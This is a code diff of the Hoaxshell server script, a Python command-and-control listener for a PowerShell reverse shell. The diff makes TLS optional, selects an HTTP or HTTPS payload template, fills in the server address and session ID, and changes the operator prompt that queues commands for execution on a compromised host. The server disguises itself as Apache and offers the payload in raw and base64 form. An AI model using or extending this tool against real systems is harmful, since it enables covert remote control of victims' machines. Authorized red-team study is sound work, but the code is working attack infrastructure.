@@ -18,21 +18,13 @@ filterwarnings("ignore", category = DeprecationWarning)
 
 ''' Colors '''
 MAIN = '\033[38;5;50m'
-GREEN = '\033[38;5;47m'
 PLOAD = '\033[38;5;46m'
+GREEN = '\033[38;5;47m'
 BLUE = '\033[0;38;5;12m'
-LPURPLE = '\033[0;38;5;201m'
 ORANGE = '\033[0;38;5;214m'
-ORANGEB = '\033[1;38;5;214m'
-PURPLE = '\033[0;38;5;141m'
-B_PURPLE = '\033[45m'
-YELLOW="\033[0;38;5;11m"
 RED = '\033[1;31m'
-B_RED = '\033[41m'
 END = '\033[0m'
-B_END = '\033[49m'
 BOLD = '\033[1m'
-ULINE = '\033[4m'
 
 
 ''' MSG Prefixes '''
@@ -45,8 +37,8 @@ FAILED = f'{RED}Fail{END}'
 parser = argparse.ArgumentParser()
 
 parser.add_argument("-s", "--server-ip", action="store", help = "Your Hoaxshell server ip address", required = True)
-parser.add_argument("-c", "--certfile", action="store", help = "Your certificate.", required = True)
-parser.add_argument("-k", "--keyfile", action="store", help = "The private key for your certificate. ", required = True)
+parser.add_argument("-c", "--certfile", action="store", help = "Your certificate.")
+parser.add_argument("-k", "--keyfile", action="store", help = "The private key for your certificate. ")
 parser.add_argument("-p", "--port", action="store", help = "Your Hoaxshell server port (default: 443)", type = int) 
 parser.add_argument("-f", "--frequency", action="store", help = "Change html elements poisoning cycle frequency (default: 1s)", type=float)
 parser.add_argument("-r", "--raw-payload", action="store_true", help = "Print payload raw instead of base64 encoded")
@@ -72,7 +64,8 @@ args = parser.parse_args()
 	# ~ except IndexError:
 		# ~ parser.print_usage()
 		# ~ sys.exit(1)
-	 
+
+ssl_support = True if args.certfile and args.keyfile else False
 
 # -------------- General Functions -------------- #                                           
 def print_banner():
@@ -99,18 +92,6 @@ def print_banner():
 		txt_color += 1
 
 	print(f'{padding}\t\t\t\t\t\t         Created by t3l3machus\n')
-
-
-
-
-# ~ def get_dt_prefix():
-	
-	# ~ now = datetime.now()
-	# ~ today = date.today()
-	# ~ current_time = now.strftime("%H:%M:%S")
-	# ~ #datetime_prefix = f'{today.strftime("%Y-%m-%d")} {current_time}'
-	# ~ datetime_prefix = [today.strftime("%Y-%m-%d"), current_time]
-	# ~ return datetime_prefix
 
 
 
@@ -147,7 +128,6 @@ def checkPulse(stop_event):
 		
 
 
-
 def chill():
 	pass
 
@@ -164,7 +144,6 @@ def rst_prompt(force_rst = False, prompt = prompt, prefix = '\r'):
 	
 	if Hoaxshell.rst_promt_required or force_rst:
 		sys.stdout.write(prefix + prompt + readline.get_line_buffer())
-		#sys.stdout.flush()
 		Hoaxshell.rst_promt_required = False	
 
 
@@ -173,6 +152,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 	
 	restored = False
 	rst_promt_required = False
+	prompt_ready = True
 	command_pool = []
 	execution_verified = False
 	last_received = ''
@@ -249,8 +229,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 	def do_POST(self):
 		global prompt
 		timestamp = int(datetime.now().timestamp())
-		Hoaxshell.last_received = timestamp
-		#rst_promt_required = True
+		Hoaxshell.last_received = timestamp		
 		self.server_version = "Apache/2.4.1"
 		self.sys_version = ""
 		session_id = self.headers.get('X-hoax-id')
@@ -274,12 +253,9 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			except UnicodeDecodeError:
 				print(f'[{WARN}] Decoding data to UTF-8 failed. Printing raw data.')
 			
-			#sys.stdout.write('\n')
 			print(f'\r{GREEN}{results}{END}') if results not in [None, ''] else print(f'\r{ORANGE}No output.{END}')
-
-			prompt = 'hoaxshell > '
-			sys.stdout.write('\rhoaxshell > ')			
-			# ~ rst_prompt()
+			
+			Hoaxshell.prompt_ready = True
 	
 		else:
 			self.send_response(200)
@@ -309,8 +285,11 @@ class Hoaxshell(BaseHTTPRequestHandler):
 def main():
 	
 	try:
-		global verbose, prompt
-		server_port = int(args.port) if args.port else 443
+		global verbose
+		if ssl_support:
+			server_port = int(args.port) if args.port else 443
+		else:
+			server_port = int(args.port) if args.port else 8080
 		
 		try:
 			httpd = HTTPServer(('0.0.0.0', server_port), Hoaxshell)
@@ -318,13 +297,14 @@ def main():
 		except OSError:	
 			exit(f'\n[{FAILED}] - {BOLD}Port {server_port} seems to already be in use.{END}\n')
 
-		httpd.socket = ssl.wrap_socket (
-			httpd.socket, 
-			keyfile = args.keyfile , 
-			certfile = args.certfile , 
-			server_side = True, 
-			ssl_version=ssl.PROTOCOL_TLS
-		)
+		if ssl_support:
+			httpd.socket = ssl.wrap_socket (
+				httpd.socket, 
+				keyfile = args.keyfile , 
+				certfile = args.certfile , 
+				server_side = True, 
+				ssl_version=ssl.PROTOCOL_TLS
+			)
 		
 
 		chill() if quiet else print_banner()
@@ -338,15 +318,16 @@ def main():
 		# Prepare payload
 		if not args.grab:
 			print(f'[{INFO}] {BOLD}Generating payload...{END}\n')
-			source = open(f'./payload.ps1', 'r')
+			source = open(f'./https_payload.ps1', 'r') if  ssl_support else open(f'./http_payload.ps1', 'r')
 			payload = source.read()
 			source.close()
 			freq = args.frequency if args.frequency else 1
-			payload = payload.replace('*SERVERIP*', args.server_ip).replace('*SESSIONID*', Hoaxshell.SESSIONID).replace('*FREQ*', str(freq))	
+			payload = payload.replace('*SERVERIP*', f'{args.server_ip}:{server_port}').replace('*SESSIONID*', Hoaxshell.SESSIONID).replace('*FREQ*', str(freq))	
 			encodePayload(payload) if not args.raw_payload else print(f'{PLOAD}{payload}{END}')
 
-			print(f'[{INFO}] {BOLD}Type "help" to get a list of the available commands.{END}')
-			print(f'[{INFO}] {BOLD}Awaiting payload execution...{END}')
+			print(f'[{INFO}] {BOLD}Type "help" to get a list of the available prompt commands.{END}')
+			print(f'[{INFO}] {BOLD}Https Server started on port {server_port}.{END}') if ssl_support else print(f'[{INFO}] {BOLD}Http Server started on port {server_port}.{END}')
+			print(f'[{INFO}] {BOLD}Awaiting payload execution to initiate shell session...{END}')
 			
 		else:
 			print(f'\r[{IMPORTANT}] Attempting to restore session. Listening for hoaxshell traffic...')
@@ -355,51 +336,51 @@ def main():
 		# Command prompt
 		while True:
 			
-			user_input = input(prompt).strip()
-			# ~ user_input = input(prompt).strip().split(' ')
-			# ~ cmd_list = [w for w in user_input if w]
-			# ~ cmd = cmd_list[0].lower() if cmd_list else ''
-			
-			if user_input.lower() == 'help':
-				print(
-				'''
-				\r  Command                    Description
-				\r  -------                    -----------
-				\r  help                       Print this message.
-				\r  payload                    Print payload again (base64). 
-				\r  rawpayload                 Print payload again (raw).                  
-				\r  clear/cls                  Clear screen.
-				\r  exit/quit/q                Terminate program.
-				''')
-
-			elif user_input.lower() in ['clear', 'cls']:
-				os.system('clear')
-			
-			elif user_input.lower() in ['payload']:
-				encodePayload(payload)
-
-			elif user_input.lower() in ['rawpayload']:
-				print(f'{PLOAD}{payload}{END}')
+			if Hoaxshell.prompt_ready:
+				user_input = input(prompt).strip()
+				# ~ user_input = input(prompt).strip().split(' ')
+				# ~ cmd_list = [w for w in user_input if w]
+				# ~ cmd = cmd_list[0].lower() if cmd_list else ''
 				
-			elif user_input.lower() in ['exit', 'quit', 'q']:
-				stop_event.set()
-				sys.exit(0)			
-			
-			elif user_input == '':
-				#pass
-				rst_prompt(force_rst = True, prompt = '\r')
-						
-			else:
+				if user_input.lower() == 'help':
+					print(
+					'''
+					\r  Command                    Description
+					\r  -------                    -----------
+					\r  help                       Print this message.
+					\r  payload                    Print payload again (base64). 
+					\r  rawpayload                 Print payload again (raw).                  
+					\r  clear/cls                  Clear screen.
+					\r  exit/quit/q                Terminate program.
+					''')
+
+				elif user_input.lower() in ['clear', 'cls']:
+					os.system('clear')
 				
-				if Hoaxshell.execution_verified and not Hoaxshell.command_pool:
-					Hoaxshell.command_pool.append(user_input)
-					prompt = ''
-					#rst_prompt(force_rst = True, prompt = '\r')
-				elif Hoaxshell.execution_verified and Hoaxshell.command_pool:
-					pass
+				elif user_input.lower() in ['payload']:
+					encodePayload(payload)
+
+				elif user_input.lower() in ['rawpayload']:
+					print(f'{PLOAD}{payload}{END}')
 					
+				elif user_input.lower() in ['exit', 'quit', 'q']:
+					stop_event.set()
+					sys.exit(0)			
+				
+				elif user_input == '':
+					rst_prompt(force_rst = True, prompt = '\r')
+							
 				else:
-					print(f'\r[{INFO}] No active session.')
+					
+					if Hoaxshell.execution_verified and not Hoaxshell.command_pool:
+						Hoaxshell.command_pool.append(user_input)
+						Hoaxshell.prompt_ready = False
+
+					elif Hoaxshell.execution_verified and Hoaxshell.command_pool:
+						pass
+						
+					else:
+						print(f'\r[{INFO}] No active session.')
 	
 			
 	except KeyboardInterrupt:
